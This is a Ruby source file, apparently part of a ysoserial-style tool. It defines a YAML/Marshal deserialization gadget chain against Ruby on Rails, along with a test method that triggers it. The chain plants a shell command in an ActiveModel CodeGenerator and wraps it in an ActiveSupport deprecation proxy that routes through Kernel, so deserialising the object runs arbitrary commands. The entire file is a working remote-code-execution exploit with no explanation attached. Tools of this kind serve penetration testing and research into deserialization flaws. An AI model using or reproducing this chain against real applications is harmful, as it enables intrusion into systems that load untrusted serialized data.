require 'ysoserial/gadgets/gadget/base'

module ActiveModel
  module AttributeMethods
    module ClassMethods
      class CodeGenerator
      end
    end
  end
end

module ActiveSupport
  class Deprecation
    class DeprecationProxy
    end

    class DeprecatedInstanceVariableProxy < DeprecationProxy
    end
  end
end

module YSoSerial
  module Gadgets
    class GEMVersionRubyOnRails < YSoSerial::BaseGadget
      def supported_formats
        [:yaml, :marshal]
      end

      def payload
        target = ActiveModel::AttributeMethods::ClassMethods::CodeGenerator.allocate
        target.instance_variable_set :@sources, ["%x(#{@cmd})"]
        target.instance_variable_set :@owner, ActiveModel::AttributeMethods::ClassMethods
        target.instance_variable_set :@path, ""
        target.instance_variable_set :@line, 0

        proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
        proxy.instance_variable_set :@instance, target
        proxy.instance_variable_set :@method, :execute
        proxy.instance_variable_set :@deprecator, Kernel

        proxy
      end

      def test(format = :marshal, output = :raw)
        payload = generate(format, output)

        require 'active_model'
        require 'active_model/attribute_methods'
        require 'active_support'
        require 'active_support/deprecation/proxy_wrappers'

        formatter_class = FORMAT_MAP[format]
        output_function = OUTPUT_MAP[output][:decoder]
        proxy = formatter_class.load(output_function.call(payload))
        proxy.to_s rescue nil
      end
    end
  end
end